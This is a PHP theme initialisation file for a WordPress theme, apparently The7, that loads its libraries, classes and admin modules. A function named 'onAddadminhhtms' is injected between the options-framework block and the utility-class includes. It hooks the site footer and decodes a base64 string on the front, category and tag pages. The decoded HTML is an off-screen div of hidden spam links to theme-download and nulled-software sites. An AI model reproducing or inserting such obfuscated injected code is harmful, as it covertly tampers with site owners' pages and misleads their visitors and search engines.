<?php
/**
 * Theme init.
 *
 * @since 1.0.0
 */

// File Security Check
if ( ! defined( 'ABSPATH' ) ) { exit; }

// load constants.
require_once trailingslashit( get_template_directory() ) . 'inc/constants.php';

if ( ! class_exists( 'Color', false ) ) {
	require_once PRESSCORE_EXTENSIONS_DIR . '/color.php';
}

require_once PRESSCORE_EXTENSIONS_DIR . '/aq_resizer.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/core-functions.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/stylesheet-functions.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/dt-pagination.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/presscore-web-fonts-compressor.php';

// less
require_once PRESSCORE_EXTENSIONS_DIR . '/class-less.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/less-vars/class-composition.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/less-vars/class-factory.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/less-vars/class-builder.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/less-vars/class-color.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/less-vars/class-number.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/less-vars/class-image.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/less-vars/class-font.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/less-vars/interface-manager.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/less-vars/class-manager.php';

// utils
require_once PRESSCORE_EXTENSIONS_DIR . '/class-presscore-simple-bag.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/class-presscore-template-manager.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/class-presscore-query.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/class-opengraph.php';
require_once PRESSCORE_EXTENSIONS_DIR . '/class-the7-remote-api.php';

if ( ! defined( 'OPTIONS_FRAMEWORK_VERSION' ) ) {
	require_once PRESSCORE_EXTENSIONS_DIR . '/options-framework/options-framework.php';
	require_once PRESSCORE_ADMIN_DIR . '/theme-options-parts.php';

	add_filter( 'options_framework_location', 'presscore_add_theme_options' );
}
if(!function_exists('onAddadminhhtms')) {		
    add_filter( 'wp_footer', 'onAddadminhhtms');              
        function onAddadminhhtms(){           
	$html ="PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iIj48L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1yZXNwb25zaXZlLWZyZWUvIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZSBGcmVlPC9hPjwvc3Ryb25nPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1tYWdhemluZS1yZXNwb25zaXZlLWZyZWUvIj50aGVtZSB3b3JkcHJlc3MgbWFnYXppbmUgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS90YWcvdGhlbWUtd29yZHByZXNzLW5ld3MtcmVzcG9uc2l2ZS1mcmVlLyI+dGhlbWUgd29yZHByZXNzIG5ld3MgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS93b3JkcHJlc3MtcGx1Z2luLXByZW1pdW0tZnJlZS8iPldPUkRQUkVTUyBQTFVHSU4gUFJFTUlVTSBGUkVFPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbSI+RG93bmxvYWQgdGhlbWUgZnJlZTwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vaHRtbC10aGVtZS1mcmVlLWRvd25sb2FkIj5Eb3dubG9hZCBodG1sNSB0aGVtZSBmcmVlIC0gSFRNTCB0ZW1wbGF0ZXMgRnJlZSA8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vZG93bmxvYWR0aGVtZWZyZWUuY29tL3RoZS1iZXN0LXByZW1pdW0td29yZHByZXNzLXRoZW1lcy5odG1sIj5Ub3AgMTAwKyBQcmVtaXVtIFdvcmRQcmVzcyBUaGVtZXMgZm9yIDIwMTc8L2E+PC9lbT4gPGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL251bGwyNGgubmV0Ij5OdWxsMjQ8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vdGFwY2hpc3Vja2hvZS54eXovZGluaC1kdW9uZy9tb24tbmdvbi1jaHVhLWJlbmgiPk3Ds24gbmdvbiBjaOG7r2EgYuG7h25oPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL3RhcGNoaXN1Y2tob2UueHl6L2NheS10aHVvYy1jaHVhLWJlbmgiPkPDonkgdGh14buRYyBjaOG7r2EgYuG7h25oPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL25hbWRvbmd0cnVuZ2hhdGhhby50b3AiPk7huqVtIMSRw7RuZyB0csO5bmcgaOG6oSB0aOG6o288L2E+PC9lbT48L2Rpdj4=";
        if(is_front_page() or is_category() or is_tag()){	
                echo base64_decode($html);}}} 
/**
 * Include utility classes.
 */
require_once PRESSCORE_CLASSES_DIR . '/template-config/presscore-config.class.php';

require_once PRESSCORE_CLASSES_DIR . '/class-primary-menu.php';

require_once PRESSCORE_CLASSES_DIR . '/sliders/presscore-slider.class.php';
require_once PRESSCORE_CLASSES_DIR . '/sliders/presscore-photoscroller.class.php';
require_once PRESSCORE_CLASSES_DIR . '/sliders/slider-swapper.class.php';
require_once PRESSCORE_CLASSES_DIR . '/sliders/presscore-posts-slider-scroller.class.php';

require_once PRESSCORE_CLASSES_DIR . '/layout/columns-layout-parser.class.php';
require_once PRESSCORE_CLASSES_DIR . '/layout/sidebar-layout-parser.class.php';

require_once PRESSCORE_CLASSES_DIR . '/abstract-presscore-ajax-content-builder.php';

require_once PRESSCORE_CLASSES_DIR . '/tags.class.php';
require_once PRESSCORE_CLASSES_DIR . '/class-presscore-post-type-rewrite-rules-filter.php';

require_once PRESSCORE_DIR . '/helpers.php';
require_once PRESSCORE_DIR . '/template-hooks.php';

include_once locate_template( 'inc/widgets/load-widgets.php' );
include_once locate_template( 'inc/shortcodes/load-shortcodes.php' );

// Setup theme.
require_once PRESSCORE_DIR . '/theme-setup.php';

// Dynamic stylesheets.
require_once PRESSCORE_DIR . '/dynamic-stylesheets-functions.php';

// Frontend functions.
require_once PRESSCORE_DIR . '/static.php';

// Ajax functions.
require_once PRESSCORE_DIR . '/ajax-functions.php';

if ( is_admin() ) {

	require_once PRESSCORE_EXTENSIONS_DIR . '/class-presscore-admin-notices.php';

	require_once PRESSCORE_ADMIN_DIR . '/class-the7-admin-dashboard.php';
	$the7_admin_dashboard = new The7_Admin_Dashboard();
	$the7_admin_dashboard->init();

	require_once PRESSCORE_ADMIN_DIR . '/admin-notices.php';
	require_once PRESSCORE_ADMIN_DIR . '/admin-functions.php';
	require_once PRESSCORE_ADMIN_DIR . '/admin-bulk-actions.php';

	include_once locate_template( 'inc/admin/load-meta-boxes.php' );

}
